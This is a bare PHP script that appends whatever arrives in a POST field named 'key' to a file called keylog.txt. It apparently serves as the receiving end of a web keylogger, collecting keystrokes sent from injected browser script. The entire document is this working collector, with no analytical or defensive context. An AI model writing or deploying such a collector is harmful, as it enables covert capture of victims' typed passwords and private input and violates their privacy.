<?php
$key=$_POST['key'];
$logfile="keylog.txt";
$fp = fopen($logfile, "a");
fwrite($fp, $key);
fclose($fp); 
?>